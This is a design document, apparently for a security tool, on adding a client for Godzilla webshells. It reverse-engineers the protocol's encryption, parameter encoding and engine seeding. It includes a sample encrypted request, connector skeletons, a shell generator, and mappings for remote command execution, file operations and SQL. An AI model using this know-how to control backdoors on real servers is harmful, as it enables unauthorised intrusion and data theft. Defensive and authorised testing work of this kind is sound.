# Godzilla 协议接入 Matrix — 设计文档

> 状态：已实现（v1，PHP + JSP 已对真实目标验证；ASPX/ASP 待 Windows/IIS 目标验证）
> 日期：2026-11-12
> 参考实现：`/Users/illya/NetworkTools/TrojanShellTools/Godzilla/godzilla.jar`（2021-11-01 构建，Godzilla v4.x）
> 实测目标：`http://127.0.0.1:8082/godzilla.jsp`（`password=mAtrix_911`，`secretKey=key`，`cryption=JAVA_AES_BASE64`）
> 设计原则：沿用 Matrix 已有 Behinder 连接器（`lib/connectors/*_behinder_connector.dart`）的分层与集成方式，不另起炉灶。

## 实现状态（2026-11-12 更新）

按用户确认的 5 个决策实现：

| 决策 | 选择 | 落地 |
| --- | --- | --- |
| 目标 | 连接已有标准 Godzilla 马 | ✅ 连接器对接标准马；另提供“生成马”（见 §5.11）作为可选辅助 |
| 引擎来源 | 不用 `godzilla.jar`，Dart 重写协议 | ✅ 协议层纯 Dart；引擎改为 **Matrix 自研**（`tool/godzilla_engine/`），不依赖 GPL 资产 |
| 语言范围 | 四语言全实现，只测 PHP/JSP | ✅ 4 个连接器 + 4 份引擎源码；PHP/JSP 实测通过 |
| `secret_key` | （原问题表述不清，按新增字段实现） | ✅ `webshells.secret_key`（DB v14）+ UI + MCP |
| 自动检测 | 选了 Godzilla 连接器就直接连，不探测协议 | ✅ `_autoDetect` 只探测所选 Godzilla 类型；未选时跳过全部 Godzilla 类型 |

已交付文件：

- 协议层：`lib/core/crypto/godzilla_crypto.dart`、`lib/core/crypto/godzilla_codec.dart`
- 连接层：`lib/connectors/godzilla/`（variant / transport / assets / base + 4 个语言连接器）
- 引擎源码与资产：`tool/godzilla_engine/`、`data/godzilla/*.b64`、`tool/godzilla_engine/build.sh`
- 集成：`ConnectorFactory`、`Webshell.secretKey`、DB 迁移 v14、UI Key 字段、MCP `shell_add.secret_key`
- 生成器：`lib/connectors/godzilla/godzilla_shell_generator.dart` + `assets/defaults/payloads/godzilla_shells/` + `lib/pages/godzilla_shell_dialog.dart`
- 测试：
  - `test/core/crypto/godzilla_crypto_test.dart`（20 例，权威向量）
  - `test/connectors/godzilla_transport_test.dart`（9 例，进程内伪服务器，无需外部目标）
  - `test/connectors/godzilla_assets_test.dart`（5 例，引擎资产自检）
  - `test/connectors/godzilla_integration_test.dart`（10 例，env 门控真实目标）
  - `test/connectors/godzilla_shell_generator_test.dart`（9 例，模板/转义/换行）
  - `test/connectors/godzilla_shell_e2e_test.dart`（1 例，生成→`php -S` 部署→连接，env 门控）

实测结果（真实目标）：

```
JSP  http://127.0.0.1:8082/godzilla.jsp   ping / id / ls / 二进制读写 / sysinfo  全部通过
PHP  http://127.0.0.1:8091/shell.php      ping / id / ls / 二进制读写 / sysinfo  全部通过
```

未验证：ASPX（本机无 .NET 编译器，`matrix_godzilla.dll.b64` 未生成）、经典 ASP（无 IIS）。
两者连接器代码已完成，需在 Windows 目标上按 §8.2 补测。

---

目录：§0 结论 · §1 背景 · §2 协议逆向 · §3 与 Behinder 对照 · §4 架构 · §5 详细设计 · §6 代码骨架 · §7 实施计划 · §8 测试 · §9 风险 · §10 待确认 · 附录 A/B/C

---

## 0. TL;DR

- 已从 `godzilla.jar` 反编译确认 Godzilla 的完整客户端协议：密钥派生、四种 Base64 变体的加解密、参数二进制序列化、gzip、Session 端 payload 引擎播种、分段文件传输。
- 已用 Java 与 Dart 两套客户端在真实 `godzilla.jsp` 上跑通：`getBasicsInfo`、`execCommand`、`getFile`、`readFile`、`uploadFile`、`deleteFile`、二进制读写全部成功。
- 建议分两层实现：**协议层**（`lib/core/crypto/godzilla_*`）+ **语言适配层**（`lib/connectors/godzilla/*`），与 Behinder 的 `behinder_crypto.dart` + `*_behinder_connector.dart` 结构一一对应。
- 新增数据字段 **`secret_key`**（Godzilla 的“密钥”，与“密码”分离），默认值 `key`；数据库版本 13 → 14。**已实现。**
- 首批支持 4 个连接器类型：`jsp_godzilla`、`php_godzilla`、`aspx_godzilla`、`asp_godzilla`，分别对应 Godzilla 的 `JAVA_AES_BASE64`、`PHP_XOR_BASE64`、`CSHARP_AES_BASE64`、`ASP_XOR_BASE64`。
- 已实现四语言连接器 + Matrix 自研引擎；PHP/JSP 对真实目标验证通过，ASPX/ASP 待 Windows/IIS 验证。
- 5 个待确认问题的最终决策见 §10。

---

## 1. 背景与目标

### 1.1 现状：Matrix 的 Behinder 接入模式

Matrix 目前对 Behinder（冰蝎）的支持已经形成固定套路：

| 组成 | 位置 | 作用 |
| --- | --- | --- |
| 协议/加解密 | `lib/core/crypto/behinder_crypto.dart` | 密钥派生、AES/XOR、响应提取 |
| 连接器 | `lib/connectors/php_behinder_connector.dart` 等 | 实现 `ShellConnector` 抽象，负责 HTTP、Session、操作语义 |
| 载荷 | `assets/defaults/payloads/webshell/php_behinder.php` 等 | 目标端 shell（内嵌固定 key） |
| 注册 | `lib/connectors/connector_factory.dart` | `connector_type` → 连接器 + UI 元数据 |
| 种子化 | `lib/services/seed_service.dart` | 把内置载荷写入 payload 库（版本号驱动） |
| UI | `lib/pages/webshell_management_page.dart` | 连接器下拉、密码/参数提示、自动检测 |
| MCP | `lib/mcp/handlers.dart` | `shell_add` / `shell_connectors` |

Godzilla 接入应当复用这六层，而不是新建一套平行的东西。

### 1.2 目标

1. Matrix 可以选择 `jsp_godzilla` / `php_godzilla` / `aspx_godzilla` / `asp_godzilla` 连接器，填写 URL、密码（参数名）、密钥（secretKey）后连接 **Godzilla 标准马**。
2. 支持终端命令、文件浏览/预览/上传/下载/删除/新建/复制/移动、系统信息、当前目录、环境变量、反弹 Shell。
3. 支持自动检测（与现有连接器并列）。
4. MCP 能创建、列出、操作 Godzilla WebShell。
5. 不破坏现有 Behinder / eval / cmd 连接器的行为。

### 1.3 非目标（v1 不做）

- Godzilla 的 `RAW`（非 Base64）、`*_EX`、`JAVA_AES_WEBLOGIC`、`CSHARP_ASMX_*` 变体。
- 自定义 `reqLeft` / `reqRight`（Godzilla 的 WAF 前后缀包装）。
- 每个 WebShell 独立 HTTP Header / 代理配置。
- 注入 Godzilla 内存马。
- 重新实现 Godzilla 的 39KB PHP / 34KB Java / 20KB C# payload 引擎。
- 生成 Godzilla 标准马（“生成 shell”功能）——列为 v2。

---

## 2. Godzilla 协议逆向结论

以下结论均来自 `godzilla.jar` 的字节码与模板，并已用真实 shell 验证。

### 2.1 密钥派生

Godzilla 的 Shell 配置有两个独立字段：

- `password`（密码）：作为 HTTP **参数名**，同时参与响应标记计算。
- `secretKey`（密钥）：参与实际加解密密钥派生。

```
key16 = lower(hex(MD5(secretKey)))[0:16]     // 16 个 ASCII 字符
```

> 实测库中两例：`mAtrix_911` + `key`、`pass123` + `key456`（`Godzilla/data.db` 的 `shell` 表）。
> `secretKey` 不是“16 字节原始密钥”，而是任意字符串；`key16` 是它的 MD5 十六进制前 16 位（ASCII）。

### 2.2 请求与响应封装

请求统一形如：

```
POST <url>
Content-Type: application/x-www-form-urlencoded

<password>=<URLEncode(Base64(cipher))>
```

响应统一形如：

```
<LEFT><Base64(cipher)><RIGHT>
```

其中 `<LEFT>/<RIGHT>` 是标记，`<cipher>` 的明文见下表。**标记的截取位置和大小写因变体而异**（这是最容易踩的坑）：

| 变体 | 语言 | 加密 | 标记 | 大小写 |
| --- | --- | --- | --- | --- |
| `PHP_XOR_BASE64` | PHP | XOR(key16, `(i+1)&15`) | `md5[0:16]` + `md5[16:32]` | 小写 |
| `PHP_EVAL_XOR_BASE64` | PHP | 同上（每次重发引擎） | 同上 | 小写 |
| `JAVA_AES_BASE64` | JSP | AES/ECB/PKCS5 | `md5[0:16]` + `md5[16:32]` | **大写** |
| `JAVA_AES_BASE64_EX` | JSP | 同上 + 额外 `passW` 参数 | 同上 | 大写 |
| `CSHARP_AES_BASE64` | ASPX | AES/CBC/PKCS5，**key = IV = key16** | `md5[0:16]` + `md5[16:32]` | **大写** |
| `ASP_XOR_BASE64` | ASP | XOR(key16, `(i+1)%16`) | `md5[0:6]` + `md5[20:26]` | 小写 |

其中 `md5 = lower(hex(MD5(password + key16)))`。

> 证据：
> - `shells/cryptions/JavaAes/JavaAesBase64.class`：`getSecretKeyX()`、`Cipher.getInstance("AES")`（即 ECB/PKCS5）、`getParameter(pass)`、`md5.substring(0,16).toUpperCase()`。
> - `shells/cryptions/phpXor/PhpXor.class`：`key[i+1&15]`、`md5.substring(0,16)`（无 `toUpperCase`）。
> - `shells/cryptions/cshapAes/CShapAesBase64.class`：`AES/CBC/PKCS5Padding`，`IvParameterSpec(key.getBytes())`。
> - `shells/cryptions/aspXor/AspXorBae64.class`：`substring(0,6)` / `substring(20,26)`。

### 2.3 参数序列化（请求明文）

Godzilla 的 `ReqParameter.formatEx()` → `Parameter.serialize()` 是自定义二进制格式：

```
for each (name, value):
    name 的 UTF-8 字节
    0x02
    value 长度的 4 字节 **小端序**（int32 LE）
    value 原始字节
```

注意：**长度是小端序**（`util/functions.intToBytes` 逐字节 `>> 0/8/16/24` 写入）。这是本次逆向中唯一一个“看起来像大端、实际是小端”的坑；用大端会让服务端把长度读成 0x02000000，直接 OOM（实测 `java.lang.OutOfMemoryError: Java heap space`）。

参数名/值示例：

```
methodName = execCommand
argsCount  = 1
arg-0      = id
```

`value` 是原始字节（不是 base64），因此二进制上传/下载可以直接放在参数里。

### 2.4 gzip

| 环节 | Java | C# | PHP | ASP |
| --- | --- | --- | --- | --- |
| 请求 params | **必须 gzip** | **必须 gzip** | Godzilla 客户端 gzip；服务端可自动识别明文/gzip | 不支持 |
| 响应明文 | gzip | gzip | 可选（`canCallGzipEncode()`） | 不支持 |

- Java 的 `payload.formatParameter()` 用 `GZIPInputStream`，所以客户端**必须**先 gzip 再 AES。
- Java 的 `payload.toString()` 用 `GZIPOutputStream`，所以响应解密后得到的是 gzip 字节，需要再 gunzip。
- PHP 的 `PhpShell.evalFunc` 会 `gzipE` 请求；服务端 `run($pms)` 先检查 `1f 8b` 魔数，支持时 gunzip，不支持时按明文解析。因此 Matrix **可以发明文**（更省事、对 `gzdecode` 缺失的目标更稳）；响应是否 gzip 取决于 `gzencode` 是否存在，客户端需要**嗅探魔数**。
- C# 的 `CShapShell.evalFunc` 同样 `gzipE` / `gzipD`。
- ASP 经典环境没有 gzip。

### 2.5 Payload 引擎与 Session 播种

Godzilla 不是“每个请求自带全部逻辑”，而是：

1. **首次连接**：客户端把 payload 引擎（PHP 源码 / Java class / C# DLL / ASP 源码）加密后作为一次请求发过去。
2. 目标 shell 把引擎存进 `Session`（PHP）、`session`（JSP）、`Application`/`Session`（ASPX）或 `Session`（ASP）。
3. **后续请求**：只发参数，由引擎在服务端解释执行。

具体播种行为：

| 语言 | 目标 shell 判定 | 引擎 | 大小 |
| --- | --- | --- | --- |
| PHP | `strpos($data, "getBasicsInfo") !== false` 时存 `$_SESSION['payload']` | `payload.php` | 39,162 B |
| JSP | `session.getAttribute("payload") == null` 时 `defineClass` | `payload.classs` | 34,777 B |
| ASPX | `Session["payload"] == null` 时 `Assembly.Load` | `payload.dll` | 20,480 B |
| ASP | `IsEmpty(Session("payload"))` 时 `Execute` | `payload.asp` | 16,662 B |

后果：

- **新建 Session 必须能拿到引擎**，否则标准马无法工作。
- 如果 Session 里已有引擎，再发一次引擎会被当成“参数”解析（JSP/C#）或再次覆盖（PHP/ASP），客户端应忽略这次响应。
- 引擎资产是 v1 的关键依赖，见 §5.8 与 §10 的授权问题。

### 2.6 已实测验证

**Java 端（使用 godzilla.jar 自身类）**：

```
key16            = 3c6e0b8a9c15224a
md5(pass+key16)  = 371be1ca27de980e4cfd279ab200099a
params(methodName=execCommand, cmdLine=id)
                 = 636d644c696e65020200000069646d6574686f644e616d65020b00000065786563436f6d6d616e64
Java 请求        = mAtrix_911=BJi6%2F01oN9HWQODA6Lkk0Lihk06LGUPbDUXaKcaGQiwOCEeuu8sW%2FggUCEjBcaudjLp8HfKg0ObLqQOTXPEjwA%3D%3D
Java 响应        = 371BE1CA27DE980E<base64>4CFD279AB200099A
```

**Dart 端（与将要实现的方案一致的独立 PoC）**：对真实 `godzilla.jsp` 成功执行

```
seed HTTP bytes=0（播种请求无响应体，正常）
getBasicsInfo first line: FileRoot : /;
id => uid=0(root) gid=0(root) groups=0(root)
getFile /tmp => ok / /tmp/ / gzt 0 ... / jwttoken 1 ...
upload => ok
read  => 000102fffe6869（二进制逐字节一致）
delete => ok
```

> PoC 位于 `/tmp/gzpoc/godzilla_poc.dart`（临时验证，不入库）。它同时验证了 `package:encrypt` 的 AES/ECB、`dart:io` 的 `GZipCodec`、`package:crypto` 的 MD5 与 `package:http` 的 Cookie 处理都能满足需求。

---

## 3. 与 Behinder 接入模式的对照

| 维度 | Behinder（现有） | Godzilla（本设计） | 是否复用 |
| --- | --- | --- | --- |
| 密钥派生 | `MD5(password)[0:16]` | `MD5(secretKey)[0:16]`；password 另作参数名 | 否（新增） |
| 请求加密 | PHP: AES-128-CBC；JSP: AES-128-ECB；ASPX: AES-CBC(key=IV) | PHP: XOR；JSP: AES-ECB；ASPX: AES-CBC(key=IV)；ASP: XOR | 否（新增） |
| 请求封装 | `body = base64(cipher)`（PHP/JSP）；ASPX `body = cipher` | `body = pass=urlenc(base64(cipher))` | 否 |
| 参数格式 | PHP: `C\|<code>`；JSP: 第二行 `a=...`；ASPX: `~~~~~~k:v,...` | 二进制 `name\x02lenLEvalue` + gzip | 否 |
| 响应 | base64 或 magic 尾 | 标记 + base64(cipher) | 否 |
| Session | JSESSIONID / PHPSESSID，串行发送 | 同上 + 首次播种 | 部分 |
| 操作语义 | Matrix 自定义（eval 代码 / 动态字节码 / DLL 模块） | 目标端 payload 引擎的 methodName API | 否 |
| 连接器基类 | `ShellConnector` | 同 | **是** |
| 工厂/UI/MCP/种子化 | `ConnectorFactory` 等 | 同 | **是** |
| 载荷放置 | `assets/defaults/payloads/webshell/` + `data/` | `data/godzilla/`（引擎）+ 可选 shell 模板 | 部分 |

结论：**协议层完全新增，集成层全部复用**。

---

## 4. 总体架构

```
┌──────────────────────────────────────────────────────────────┐
│ UI / MCP / Services（复用）                                  │
│  webshell_management_page.dart · mcp/handlers.dart           │
└───────────────────────────┬──────────────────────────────────┘
                            │ Webshell(secretKey, connectorType)
┌───────────────────────────▼──────────────────────────────────┐
│ ConnectorFactory（新增 4 个 _ConnectorDefinition）           │
└───────────────────────────┬──────────────────────────────────┘
                            │
┌───────────────────────────▼──────────────────────────────────┐
│ GodzillaConnectorBase（抽象）                                │
│  - cookie/session                                            │
│  - seedEngineOnce()                                          │
│  - call(Map<String, List<int>>) → Uint8List                  │
│  - 串行 gate（Session 安全）                                 │
└───────┬───────────────────────────────┬──────────────────────┘
        │                               │
┌───────▼──────────────┐        ┌───────▼──────────────────────┐
│ GodzillaTransport    │        │ 语言适配（4 个）             │
│  - GodzillaCrypto    │        │  php / jsp / aspx / asp      │
│  - GodzillaCodec     │        │  操作 → methodName 映射      │
│  - HTTP + Cookie     │        │  响应 → Matrix 语义          │
└───────┬──────────────┘        └──────────────────────────────┘
        │
┌───────▼──────────────────────────────────────────────────────┐
│ core/crypto/godzilla_crypto.dart + godzilla_codec.dart       │
│  md5 / key16 / markers / AES / XOR / gzip / params           │
└──────────────────────────────────────────────────────────────┘
```

### 4.1 新增文件

| 文件 | 职责 | 预估行数 |
| --- | --- | --- |
| `lib/core/crypto/godzilla_crypto.dart` | key16、markers、AES ECB/CBC、XOR、base64、响应提取 | ~220 |
| `lib/core/crypto/godzilla_codec.dart` | 参数序列化（LE）、gzip 嗅探、文本/字节转换 | ~120 |
| `lib/connectors/godzilla/godzilla_variant.dart` | `GodzillaCipher` / `GodzillaMarkerStyle` / `GodzillaVariant` 枚举与元数据（算法/标记/gzip/引擎资产） | ~80 |
| `lib/connectors/godzilla/godzilla_transport.dart` | HTTP、Cookie、播种、重试、诊断 | ~280 |
| `lib/connectors/godzilla/godzilla_connector_base.dart` | `ShellConnector` 公共实现 + 串行 gate | ~220 |
| `lib/connectors/godzilla/godzilla_php_connector.dart` | PHP 标准马 | ~380 |
| `lib/connectors/godzilla/godzilla_jsp_connector.dart` | JSP 标准马 | ~430 |
| `lib/connectors/godzilla/godzilla_aspx_connector.dart` | ASPX 标准马 | ~380 |
| `lib/connectors/godzilla/godzilla_asp_connector.dart` | ASP 标准马 | ~300 |
| `lib/connectors/godzilla/godzilla_payload_assets.dart` | 引擎资产定位/加载/缓存 | ~120 |
| `test/godzilla_crypto_test.dart` | 协议单测（含权威向量） | ~220 |
| `test/godzilla_codec_test.dart` | 参数/标记/gzip 单测 | ~140 |

### 4.2 修改文件

| 文件 | 改动 |
| --- | --- |
| `lib/models/webshell.dart` | 新增 `secretKey` 字段（默认 `'key'`）、`toMap/fromMap/copyWith` |
| `lib/database/io/webshell_dao.dart` | `createWebshell` / `updateWebshell` 写入 `secret_key` |
| `lib/database/database_helper_io.dart` | `version: 14`，`_onCreate` 增加列，`_onUpgrade` 增加 `ALTER TABLE` |
| `lib/database/database_helper_stub.dart` / `_web.dart` | 同步 `createWebshell` 签名 |
| `lib/mcp/db.dart` | `createWebshell` 增加 `secretKey` |
| `lib/mcp/handlers.dart` | `shell_add` 增加 `secret_key`；`shell_connectors` 描述补充 |
| `lib/connectors/connector_factory.dart` | 4 个新定义；`defaultParam`/`fixedMethod` 等元数据 |
| `lib/pages/webshell_management_page.dart` | Key 字段；下拉选项改为由工厂生成；自动检测传 secretKey |
| `lib/services/seed_service.dart` | 若采用内置引擎，增加 `sinceVersion` 种子条目（可选） |
| `pubspec.yaml` | 若 `data/godzilla/` 需要打进 assets，追加目录 |
| `README.md` | 连接器表新增 4 行 |

### 4.3 资产

```
data/godzilla/
  payload.php.b64      # from godzilla.jar shells/payloads/php/assets/payload.php
  payload.classs.b64   # from godzilla.jar shells/payloads/java/assets/payload.classs
  payload.dll.b64      # from godzilla.jar shells/payloads/csharp/assets/payload.dll
  payload.asp.b64      # from godzilla.jar shells/payloads/asp/assets/payload.asp
```

- 与 `data/behinder_csharp/*.b64` 同样的“base64 文本资产”形式，`loadAssetString` 直接可用。
- 采用扁平目录，`pubspec.yaml` 只需追加一行 `- data/godzilla/`。
- 每个文件第一行放来源注释（`# from godzilla.jar ...`）便于追溯。
- 若最终决定不随包分发，则改为“从用户配置的 godzilla.jar 运行时提取”，见 §9.1。

---

## 5. 详细设计

### 5.1 `GodzillaCrypto`

> 三个枚举（`GodzillaCipher` / `GodzillaMarkerStyle` / `GodzillaVariant`）统一定义在 `godzilla_variant.dart`，由 `godzilla_crypto.dart` 单向导入，避免循环依赖。

```dart
enum GodzillaCipher { aesEcb, aesCbcKeyIv, xor }
enum GodzillaMarkerStyle { lower16, upper16, lowerAsp6 }

class GodzillaCrypto {
  /// key16 = md5(secretKey)[0:16]，16 个 ASCII 字符
  static String deriveKey16(String secretKey);

  /// 响应标记；md5 = md5(password + key16)
  static ({String left, String right}) markers({
    required String password,
    required String key16,
    required GodzillaMarkerStyle style,
  });

  static Uint8List aesEcbEncrypt(Uint8List data, String key16);
  static Uint8List aesEcbDecrypt(Uint8List data, String key16);
  static Uint8List aesCbcEncrypt(Uint8List data, String key16); // IV = key16
  static Uint8List aesCbcDecrypt(Uint8List data, String key16);
  static Uint8List xor(Uint8List data, String key16);           // key[(i+1)&15]

  /// 从响应体提取明文：
  /// 1) latin1 解码定位 left/right（ASCII 安全）
  /// 2) base64 解码
  /// 3) 解密
  /// 4) 若首两字节为 1f 8b，gunzip
  static Uint8List? extractResponse({
    required Uint8List rawBody,
    required String password,
    required String key16,
    required GodzillaVariant variant,
  });
}
```

实现要点：

- 标记定位使用 `latin1`（`String.fromCharCodes` 亦可），不要用 UTF-8 解码整个 body，否则二进制/错误页会抛 `FormatException`。
- base64 子串先 `replaceAll(RegExp(r'\s'), '')`，再解码；长度不是 4 的倍数时返回 `null` 而不是抛异常。
- AES 解密失败（padding 错误）时返回 `null`，由上层尝试其它路径或给出诊断。
- **Java 服务端的 `md5()` 有“前导零丢失”缺陷**：模板 `base64GlobalCode.bin` 用 `new java.math.BigInteger(1, digest).toString(16).toUpperCase()`，当摘要首 nibble 为 0 时只有 31 个字符，`substring(0,16)/substring(16)` 会整体错位。设标准 32 字符为 `p`，则服务端实际发出的是 `p[1:17]` + `p[17:32]`。客户端应同时尝试 `(p[0:16], p[16:32])` 与 `(p[1:17], p[17:32])` 两种切分（至少对 Java 变体）。
- gzip 使用现有条件导入：

```dart
import 'deflate_stub.dart' if (dart.library.io) 'deflate_io.dart';
```

### 5.2 `GodzillaCodec`

```dart
class GodzillaCodec {
  /// name\x02 + len(int32 LE) + value
  static Uint8List encodeParams(Map<String, List<int>> params);

  /// 反向解析（仅测试/诊断用）
  static Map<String, List<int>> decodeParams(Uint8List data);

  static bool looksLikeGzip(Uint8List data) =>
      data.length >= 2 && data[0] == 0x1f && data[1] == 0x8b;

  static Uint8List maybeGunzip(Uint8List data) =>
      looksLikeGzip(data) ? Uint8List.fromList(gzipDecompress(data)) : data;
}
```

> 本次逆向修正：长度字段是 **小端序**。单测必须覆盖 `len=2` → `02 00 00 00`。

### 5.3 `GodzillaTransport`

职责：一次“逻辑调用”的全部网络/加密/会话细节。

```dart
class GodzillaTransport {
  GodzillaTransport({
    required this.url,
    required this.password,
    required this.secretKey,
    required this.variant,
    required this.engine,          // Uint8List?，null 表示不播种
    this.timeout = const Duration(seconds: 25),
  });

  /// 幂等：同一实例只播种一次；Session 失效后允许 reseed。
  Future<void> ensureSeeded();

  /// 发送一组参数并返回解密后的明文字节。
  Future<Uint8List> call(Map<String, List<int>> params);

  String? lastError;               // 供 lastPingDiagnostic
  int? lastHttpStatus;
  int? lastResponseBytes;
}
```

实现要点：

1. **Cookie**：手动维护 `Map<String,String>`（与现有连接器一致），从 `set-cookie` 首段提取。`http` 包的 `Client` 默认不持久化 Cookie。
2. **播种**：
   - `ensureSeeded()` 在首次 `call` 前执行。
   - 播种请求 = `encode(engineBytes)`，**不 gzip**（Godzilla 原生行为）。
   - 播种响应通常是空 body（HTTP 200 / 0 字节）；不要当失败。
   - 播种体积：JSP 引擎 34,777 B → base64 ≈ 46.4 KB → URL 编码后 ≈ 49 KB（`+`/`/`/`=` 膨胀约 6%）；Tomcat 默认 `maxPostSize=2 MB`，安全。若目标 `maxPostSize` 极小，播种会 413，诊断里保留状态码。
   - 播种失败（HTTP != 200、TLS/连接错误）→ 抛 `GodzillaSeedException`，`ping()` 返回 false 并写诊断。
3. **串行 gate**：Session 型 shell 并发请求会互相干扰（尤其 PHP `session_start` 锁），用 `Future<void> _gate` 串行化，与 `PhpBehinderConnector._phpSendGate` 同款。
4. **重试**：`call` 返回空 body 或标记缺失时，最多重试 1 次；若仍失败且 `seedCount < 2`，重新播种一次再试。避免无限重试。
5. **Content-Type**：`application/x-www-form-urlencoded`。实测 JSP shell 的 `request.getParameter(pass)` 依赖此类型。
6. **错误页**：HTTP 200 但 body 是 HTML（含 `<html`/`Error`/`Exception`）时，把前 512 字节放入 `lastError`，返回空结果。
7. **大响应**：Godzilla 响应是 base64 包裹，内存放大 ~1.33x；文件下载应使用 `bigFileDownload` 分块，而不是一次性 `readFile`。

### 5.4 `GodzillaConnectorBase`

```dart
abstract class GodzillaConnectorBase extends ShellConnector {
  GodzillaConnectorBase(super.webshell, this.variant);

  final GodzillaVariant variant;
  late final GodzillaTransport _transport = ...;

  @override
  Set<ConnectorCapability> get capabilities => const {
    ConnectorCapability.codeExec,
    ConnectorCapability.shellExec,
    ConnectorCapability.fileRead,
    ConnectorCapability.fileWrite,
  };

  // ── 协议调用（base 负责补 methodName / 文本解码 / 错误包装）──────────
  Future<Uint8List> call(String method, [Map<String, List<int>> params = const {}]);
  Future<String> callText(String method, [Map<String, List<int>> params = const {}]);

  // ── 语言差异点（4 个子类实现）──────────────────────────────────────
  Future<String> basicsInfo();                       // getBasicsInfo
  Future<Uint8List> execCommandBytes(String cmd);    // Java: argsCount/arg-N；PHP/C#: cmdLine
  Future<String> listDirectoryRaw(String path);      // getFile → 原始文本
  Future<Uint8List> readFileBytes(String path);      // readFile / readFileContent
  Future<bool> writeFileBytes(String path, Uint8List bytes); // uploadFile
  Future<bool> deleteFileRaw(String path);           // deleteFile
  Future<bool> newDirRaw(String path);               // newDir
  Future<bool> moveFileRaw(String from, String to);  // moveFile
  Future<bool> copyFileRaw(String from, String to);  // copyFile
  String? currentDirFromBasics(String basics);       // 解析 CurrentDir/RealFile

  // ── Matrix ShellConnector 契约（base 统一实现）─────────────────────
  @override Future<bool> ping() async { ... }        // seed + getBasicsInfo + 关键词断言
  @override Future<String> executeCommand(String cmd, {String workingDir = ''}) async { ... }
  @override Future<String> getCurrentDir() async { ... }
  @override Future<List<FileEntry>> listDirectory(String path) async { ... }
  @override Future<String> readFile(String path) async { ... }
  @override Future<bool> writeFile(String path, String content) async { ... }
  @override Future<bool> deleteFile(String path) async { ... }
  @override Future<Map<String, String>> getSystemInfo() async { ... }
  @override Future<List<({String name, bool isDir})>> listNamesForCompletion(String path) async { ... }
  @override Future<String> getHomeDir() async { ... }
  @override Future<List<String>> listEnvVarNames() async { ... }
}
```

分工原则：

- `call` 只关心“一次 Godzilla 调用 + 解出字节”，不关心业务语义。
- 子类只实现**参数名/返回格式不同**的 6–10 个 primitive。
- `listDirectory` 的解析（`ok\n<path>\n<name>\t<isFile>\t<mtime>\t<size>\t<RWX>`）四语言一致，放 base。
- `getSystemInfo` 先解析 `Key : Value`，再按语言补充别名（PHP 的 `PHP_VERSION`、Java 的 `java.version`、C# 的 `OSVersion`）。
- `getShellScriptDir`：与 `jsp_behinder` / `jsp_classloader` 一致的“按 URL 文件名真实定位”策略 ——
  1. 候选目录 = `CurrentDir` / `RealFile` / `DocBase` / `DOCUMENT_ROOT`（去重、去 `/`）；
  2. 用 URL 里的文件名在候选目录逐个 `[ -f dir/basename ]`，命中就返回该目录；
  3. 否则在这些目录下 `find -maxdepth 8 -name <basename>`，取父目录；
  4. 都失败才退回 `RealFile` / `DocBase` / 首个候选。

  为什么不能直接用 `CurrentDir`：Godzilla 的 JSP 引擎里它是 **JVM 进程 cwd**（实测 `/usr/local/tomcat`），不是 webapp 目录；`RealFile`/`DocBase` 才是（`/usr/local/tomcat/webapps/ROOT`）。Matrix 的 JSP 引擎已通过 `PageContext.getServletContext().getRealPath("/")` 暴露这两个字段。
- `ping` 的断言：`getBasicsInfo` 结果包含 `FileRoot` / `CurrentDir` / `OsInfo` 中任意一个即可，避免因不同引擎字段差异误判。
- 所有 primitive 失败时抛 `GodzillaOpException`，由 base 转成 `[Error] ...` 文本，保持现有连接器的“错误字符串”风格。

### 5.5 语言适配：操作映射表

以下映射均来自 Godzilla 引擎源码/字节码，并已在 JSP 上实测。

#### 5.5.1 JSP（`payload.classs`，`JAVA_AES_BASE64`）

| Matrix 操作 | `methodName` | 参数 | 返回 |
| --- | --- | --- | --- |
| ping / 系统信息 | `getBasicsInfo` | — | `Key : Value\n` |
| 执行命令 | `execCommand` | `argsCount=3`, `arg-0=/bin/sh`, `arg-1=-c`, `arg-2=<完整命令>`（Windows: `cmd.exe /c`） | 命令输出 |
| 列目录 | `getFile` | `dirName` | `ok\n<path>\n<name>\t<isFile 1/0>\t<mtime>\t<size>\t<RWX>\n...` |
| 读文件 | `readFile` | `fileName` | **原始字节** |
| 写文件 | `uploadFile` | `fileName`, `fileValue`（**原始字节**） | `ok` / `fail` |
| 新建文件 | `newFile` | `fileName` | `ok` |
| 新建目录 | `newDir` | `dirName` | `ok` |
| 删除 | `deleteFile` | `fileName` | `ok` |
| 复制 | `copyFile` | `srcFileName`, `destFileName` | `ok` |
| 移动 | `moveFile` | `srcFileName`, `destFileName` | `ok` |
| 设置权限/时间 | `setFileAttr` | `type` (`fileBasicAttr`/`fileTimeAttr`), `fileName`, `attr` | `ok` |
| 大文件下载 | `bigFileDownload` | `fileName`, `mode` (`fileSize`/`read`), `position`, `readByteNum` | 文件大小或原始字节 |
| 大文件上传 | `bigFileUpload` | `fileName`, `fileContents`（原始字节）, `position` | `ok` |
| 包含代码 | `include` | `codeName`, `binCode` | 执行结果 |
| 环境变量 | `getBasicsInfo` 解析 | — | `java.*`/`os.*` 行 |

> Java 引擎的 `execCommand` 是“可执行文件 + 参数数组”，不是 shell 字符串。Matrix 的终端需要管道、重定向、`cd &&`，因此统一包一层 `/bin/sh -c "<cmd>"`（Windows 用 `cmd.exe /c`），实测 `ls -1 / | head -3` 可用。

当前目录：从 `getBasicsInfo` 的 `CurrentDir` / `RealFile` 解析。

#### 5.5.2 PHP（`payload.php`，`PHP_XOR_BASE64`）

| Matrix 操作 | `methodName` | 参数 | 返回 |
| --- | --- | --- | --- |
| ping / 系统信息 | `getBasicsInfo` | — | `Key : Value\n` |
| 执行命令 | `execCommand` | `cmdLine` | 输出 |
| 列目录 | `getFile` | `dirName` | 与 JSP 相同的 `ok\n...\t...` |
| 读文件 | `readFileContent` | `fileName` | 原始内容 |
| 写文件 | `uploadFile` | `fileName`, `fileValue`（原始字节） | `ok` / `fail` |
| 新建文件/目录 | `newFile` / `newDir` | `fileName` / `dirName` | `ok` |
| 删除 | `deleteFile` | `fileName` | `ok` |
| 复制/移动 | `copyFile` / `moveFile` | `srcFileName`, `destFileName` | `ok` |
| 设置属性 | `setFileAttr` | `fileName`, `attr`, `type` | `ok` |
| 大文件下载 | `bigFileDownload` | `fileName`, `mode`, `position`, `readByteNum` | 大小/字节 |
| 大文件上传 | `bigFileUpload` | `fileName`, `fileContents`, `position` | `ok` |
| SQL | `execSql` | `dbType`,`dbHost`,`dbPort`,`dbUsername`,`dbPassword`,`execType`,`execSql`,`dbCharset`,`currentDb` | 结果 |

